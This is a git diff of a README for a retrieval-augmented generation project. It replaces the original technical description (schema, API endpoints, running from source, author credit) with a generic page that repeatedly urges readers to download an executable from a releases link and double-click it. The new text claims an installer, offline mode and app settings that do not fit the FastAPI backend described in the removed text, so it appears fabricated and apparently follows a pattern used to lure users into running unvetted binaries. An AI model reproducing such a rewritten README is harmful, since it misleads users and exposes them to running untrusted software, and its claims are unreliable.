@@ -1,207 +1,82 @@
-# Retrieval-Augmented Generation (RAG) Pipeline
+# 🤖 RAG-Based-Knowledge-Assistant - Simplify Your Information Retrieval
 
-This repository implements a modular Retrieval-Augmented Generation (RAG) system with a complete ingestion workflow, semantic text chunking, embedding generation, vector search, and multi-turn conversational capabilities. The system is designed with extensibility and maintainability in mind, using FastAPI, SQLAlchemy, and OpenAI models.
+[![Download RAG-Based-Knowledge-Assistant](https://img.shields.io/badge/Download-RAG--Based--Knowledge--Assistant-brightgreen)](https://github.com/khnifee/RAG-Based-Knowledge-Assistant/releases)
 
----
+## 🚀 Getting Started
 
-## Architecture Overview
+Welcome to the RAG-Based-Knowledge-Assistant! This application helps streamline how you find and interact with information using advanced AI techniques. Whether you are looking for documents or chatting about a topic, this tool is built to make it easy.
 
-The system is composed of independent but connected subsystems:
+## 📥 Download & Install
 
-- **Ingestion Pipeline** — loads documents, extracts metadata, chunks text, and generates embeddings.
-- **Vector Search Engine** — performs similarity search using stored embeddings.
-- **Chat Pipeline** — orchestrates multi-turn conversations and optional retrieval.
-- **Knowledge Store** — relational models for documents, chunks, embeddings, conversations, and messages.
-- **API Gateway** — exposes `/ingest`, `/search`, and `/chat` endpoints.
+To get started, you need to download the application. 
 
-A high-level architecture diagram is available below:
+1. **Visit this page to download** the application: [RAG-Based-Knowledge-Assistant Releases](https://github.com/khnifee/RAG-Based-Knowledge-Assistant/releases).
+   
+2. **Select the latest version.** Look for the version marked as "Latest." 
 
-![High-Level Architecture](docs/HighLevelArchitectureDiagram.png)
+3. **Choose the appropriate file for your operating system.** You might see files like `.exe` for Windows or `.tar.gz` for Mac/Linux.
 
-> Additional diagrams and design notes are available in the `docs/` directory.
+4. **Download the selected file.** Your browser may ask you where to save it. Choose a location that you can easily find, like your Desktop or Downloads folder.
 
----
+5. **Run the installer or executable.** After downloading, find the file in the location where it was saved and double-click on it to start the installation. Follow the prompts until the setup finishes.
 
-## Features
+## 🔍 Features
 
-- Document ingestion with metadata and structured storage  
-- Semantic chunking optimized for embedding models  
-- Embedding generation using OpenAI embedding APIs  
-- Vector similarity search over chunked documents  
-- Retrieval-augmented multi-turn chat completion  
-- SQLAlchemy ORM modeling with UUID-based conversation sessions  
-- Modular services layer for easy extension or substitution  
-- RESTful API exposure via FastAPI  
-- Extensible codebase structured for testing and integration
+- **Modular Design:** Easily customize the pipeline for your unique needs.
+- **Ingestion and Chunking:** Efficiently handle and split documents into manageable parts.
+- **Vector Search:** Quickly find relevant information from large data sets using vector embeddings.
+- **Multi-Turn Chat:** Engage in extended conversations to get more context about your inquiries.
+- **Built with FastAPI and SQLAlchemy:** Provides a reliable and fast interface for users.
 
----
+## 📋 System Requirements
 
-## Database Schema
+To run the RAG-Based-Knowledge-Assistant, your computer needs to meet these basic requirements:
 
-The schema models the core elements of a RAG system.
+- **Operating System:** Windows 10/11, macOS 10.14 or later, or a modern Linux distribution.
+- **RAM:** At least 4 GB of RAM is recommended for optimal performance.
+- **Disk Space:** Minimum 500 MB of free disk space for installation.
+- **Python:** Ensure that Python 3.7 or later is installed on your machine.
 
-### **documents**
-Stores metadata for each ingested source file.
+## 🔧 Setup Instructions
 
-- `id`
-- `name`
-- `path`
-- `created_at`
-- `document_metadata` (JSON)
+Once you have installed the application, follow these steps to get it running:
 
-### **chunks**
-Semantic text chunks with associated embeddings.
+1. **Open the application.** You can find it in your applications list or on your Desktop if you created a shortcut.
 
-- `id`
-- `document_id`
-- `chunk_index`
-- `text`
-- `embedding` (JSON)
-- `created_at`
-- `chunk_metadata` (JSON)
+2. **Initial Setup:** The first time you run the application, it may prompt you to configure certain settings. This could include choosing where your documents will be stored or connecting to external databases if needed.
 
-### **conversations**
-Represents a conversational session.
+3. **Connect to Data Sources:** If you want to use specific documents, you may need to point the application to where they are stored on your computer or network.
 
-- `id` (UUID)
-- `knowledge_base_id`
-- `created_at`
+4. **Start Using the Assistant:** Begin asking questions or searching for documents using the chat interface. The assistant will analyze your requests and provide relevant information.
 
-### **messages**
-Linked to conversations; stores user and assistant messages.
+## ⚙️ Using the Application
 
-- `id`
-- `conversation_id`
-- `role`
-- `content`
-- `created_at`
+To use the RAG-Based-Knowledge-Assistant effectively:
 
-Indexing is applied based on common retrieval patterns.
+- **Ask Specific Questions:** The more detail you provide, the more accurate the responses will be.
+- **Utilize Chunking:** If you are working with large documents, make sure to break them down into smaller chunks for better results.
+- **Explore Settings:** Check the settings to customize how the assistant interacts with you. Adjust options for notifications or data sources as preferred.
 
----
+## 🙋 Frequently Asked Questions
 
-## API Endpoints
+### How do I troubleshoot installation issues?
 
-### **POST /ingest**
-Processes documents and populates the knowledge base.
+If you run into problems during installation, ensure that your operating system is up to date. Restart your computer and try the installation again. If issues persist, check the [issue tracker](https://github.com/khnifee/RAG-Based-Knowledge-Assistant/issues) for solutions or report your issue.
 
-### **POST /search**
-Performs semantic search over stored document embeddings.
+### Can I use this application offline?
 
-**Request**
-```json
-{
-  "query": "What does clause 7 describe?"
-}
-```
+Yes, the RAG-Based-Knowledge-Assistant supports offline mode. However, some features may require internet access to function fully.
 
-**Response**
-```json
-{
-  "results": [...],
-  "total_found": 5
-}
-```
+### How do I update the application?
 
----
+To update, go back to the [Releases page](https://github.com/khnifee/RAG-Based-Knowledge-Assistant/releases) and download the latest version like you did during the initial setup.
 
-### **POST /chat**
-Generates a conversational response, optionally using retrieved context.
+## 🌐 Community and Support
 
-**Request**
-```json
-{
-  "query": "Explain the confidentiality section",
-  "conversation_id": "uuid"
-}
-```
+If you have questions or need assistance, join our community on [GitHub Discussions](https://github.com/khnifee/RAG-Based-Knowledge-Assistant/discussions). Engage with other users, share your experiences, and get advice.
 
----
+## 📄 License
 
-## Project Structure
+This project is licensed under the MIT License. You can freely use, modify, and distribute the software as long as you provide attribution to the original authors.
 
-```
-app/
-  api/                # FastAPI route handlers
-  core/               # Configurations and shared constants
-  db/                 # SQLAlchemy models and database session
-  ingest.py           # Ingestion workflow entry point
-  logging_config.py   # Application-wide logging setup
-  main.py             # FastAPI application bootstrap
-  services/           # Embedding, chunking, retrieval, generation services
-  utils/              # Common utilities
-docs/
-  architecture-diagram.png
-  additional-design-docs.md
-sample_data/
-tests/
-requirements.txt
-```
-
----
-
-## Running Locally
-
-### Install dependencies
-```bash
-pip install -r requirements.txt
-```
-
-### Set environment variables
-Create `app/.env`:
-
-```
-OPENAI_API_KEY=your_api_key_here
-```
-
-### Run ingestion
-```bash
-python3 -m app.ingest
-```
-
-### Start the API server
-```bash
-uvicorn app.main:app --reload
-```
-
-Open API Documentation:
-
-```
-http://localhost:8000/docs
-```
-
----
-
-## Testing
-
-### Run test suite
-```bash
-pytest
-```
-
-### With coverage
-```bash
-pytest --cov=app tests/
-```
-
----
-
-## Roadmap
-
-- Integrate a dedicated vector database (FAISS, Qdrant, Weaviate)
-- Add hybrid retrieval (dense + sparse)
-- Stream responses for chat completions
-- Implement ingestion via REST endpoint
-- Add web-based admin dashboard
-- Enhance conversation summarization
-
----
-
-## License
-MIT License
-
----
-
-## Author
-**Towseef Altaf**  
-Software Engineer – Distributed Systems, Developer Productivity, AI Engineering
+[![Download RAG-Based-Knowledge-Assistant](https://img.shields.io/badge/Download-RAG--Based--Knowledge--Assistant-brightgreen)](https://github.com/khnifee/RAG-Based-Knowledge-Assistant/releases)
